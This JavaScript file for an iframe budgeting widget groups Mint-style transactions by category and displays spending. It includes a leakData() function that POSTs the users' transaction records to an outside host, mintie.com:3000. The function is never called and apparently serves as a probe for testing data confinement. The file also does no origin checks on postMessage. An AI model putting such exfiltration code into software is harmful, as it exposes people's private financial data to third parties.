  var categories = {};
  var accounts = {};
  var transactions = [];

  function constructCategories(categoriesArray) {
    categoriesArray.forEach(function(data) {
      console.log('Data', data);
      categories[data.id] = {};
      categories[data.id]['title'] = data.title;
      categories[data.id]['budget'] = data.budget;
      categories[data.id]['icon'] = data.icon;
      categories[data.id]['transactions'] = [];
    });

    // add category for unknown bank accounts
    categories['unknown'] = {
      title: 'Uncategorized',
      icon: 'glyphicon-question-sign',
      transactions: []
    };

    console.log('Categories', categories);
  }

  function constructAccounts(accountsObj) {
    Object.keys(accountsObj).forEach(function(key) {
      var data = accountsObj[key];
      accounts[data.account_id] = data.category;
    });
  }

  function constructTransactions(transactionData) {
    // cache the transactions for later use
    transactions = transactionData;

    Object.keys(categories).forEach(function(categoryKey) {
      var category = categories[categoryKey];
      category.transactions = [];
    });
    // go through each transaction, see which categorty it belongs to then add to category
    transactions.forEach(function(data) {
      var cID = accounts[data.account_id];
      if (!cID) {
        cID = 'unknown';
      }
      var category = categories[cID];
      // category.transactions = [];
      categories[cID]['transactions'].push(data);
    });
  }

  console.log('Inside iframe');
  function onReceive(ev) {
    console.log('A msg');
    var data = ev.data;

    var protectedObj = data.protectedObject;

    // should contain the mint data...
    if (protectedObj['categories']) {
      constructCategories(protectedObj['categories']);
      constructAccounts(protectedObj['accounts']);
      constructTransactions(transactions);
      displayCategories();
    }

    if (protectedObj['transactions']) {
      constructTransactions(protectedObj['transactions']);
      // update categories etc
      displayCategories();
    }


    console.log('Received data', data);
    console.log('Protected obj', protectedObj);
    //console.log('Categories', categories);

    // displayCategories(categories);
     // figure out who it is from
  }
  window.addEventListener('message', onReceive, false);

  // tell parent that we are ready...
  function onDOMLoaded() {
    parent.postMessage('ready', '*');
  }
  window.addEventListener('DOMContentLoaded', onDOMLoaded, false);

  function displayCategories() {
    var categoriesEl = document.getElementById('categories');
    categoriesEl.innerHTML = '';

    // clear categories element
    var tmpl = document.getElementById('category-template');

    // show category
    Object.keys(categories).forEach(function(key) {
      var category = categories[key];
      var tmplClone = tmpl.content.cloneNode(true);
      tmplClone.querySelector('.category').setAttribute('data-category', key);
      tmplClone.querySelector('.category-title').innerText = category.title;

      tmplClone.querySelector('.category-icon').className += ' ' + category.icon;

      if (!category.transactions) {
        tmplClone.querySelector('.category-spending').innerText = "$0";
      } else {
        var transactions = category.transactions;
        // calculate sum etc
        var sum = 0;

        transactions.forEach(function(trans) {
          sum += parseInt(trans.amount);
        });

        var spendingText = "$" + sum;

        if (category.budget) {
          spendingText += ' / $' + category.budget;
        }
        tmplClone.querySelector('.category-spending').innerText = spendingText;

      }

      categoriesEl.appendChild(tmplClone);
    });
  }

function leakData() {
  try {
    var req = new XMLHttpRequest();
    req.open('POST', 'http://mintie.com:3000/');
    req.send(JSON.stringify(transactions));
  } catch(e) {
    console.log("Failed to leak!");
  }
}

$('#transactions-modal').on('show.bs.modal', function (event) {
  var button = $(event.relatedTarget);
  var cID = button.data('category'); // Extract info from data-* attributes
  var category = categories[cID];

  var modal = $(this);
  var modalTbody = modal.find('tbody').empty()[0];

  // go through each transaciton
  // append a template
  var transactions = category.transactions;
  var transactionEl = document.getElementById('transaction-template');

  transactions.forEach(function(transaction) {
    var tmpl = transactionEl.content.cloneNode(true);
    tmpl.querySelector('.date').innerText = transaction.date;
    tmpl.querySelector('.account').innerText = transaction.account_id;
    tmpl.querySelector('.amount').innerText = '$' + transaction.amount;

    modalTbody.appendChild(tmpl);
  });
});

